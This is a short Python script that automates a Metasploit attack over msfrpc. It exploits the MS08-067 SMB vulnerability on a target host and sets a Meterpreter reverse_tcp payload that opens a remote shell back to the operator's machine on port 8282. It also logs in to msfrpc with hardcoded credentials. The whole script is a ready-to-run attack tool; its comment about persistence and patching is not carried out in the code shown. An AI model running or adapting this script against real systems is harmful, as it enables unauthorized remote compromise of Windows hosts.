#!/usr/bin/python

import msfrpc, optparse, sys, commands
from time import sleep

# Exploits the chain of rc files to exploit MS08-067, setup persistence, and patch
def sploiter (LHOST, RHOST):
  client = msfrpc.Msfrpc({})
  client.login('msf', 'test')
  console_id = client.call('console.create')['id']
  client.call('console.read',[console_id])

## Exploit MS08-067 ##
  cmds = """use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 8282
set LHOST """+LHOST+"""
set RHOST """+RHOST+"""
set ExitOnSession false
exploit -z
"""
  print "[+] Exploithing MS08-067 on: "+RHOST
  client.call('console.write',[console_id,cmds])

  sleep(10)
  res = client.call('console.read',[console_id])
  print res['data']

if __name__ == "__main__":
  parser = optparse.OptionParser(sys.argv[0] + ' -l LHOST -r RHOST')
  parser.add_option('-l', dest='LHOST', type='string', help='Specify a local host')
  parser.add_option('-r', dest='RHOST', type='string', help='Specify a remote host')
  (options, args) = parser.parse_args()
  LHOST=options.LHOST; RHOST=options.RHOST

  if (RHOST == None):
    print parser.usage
    sys.exit(0)

  if (LHOST == None):
    LHOST=commands.getoutput("/sbin/ifconfig").split("\n")[1].split()[1][5:]

  sploiter(LHOST, RHOST)

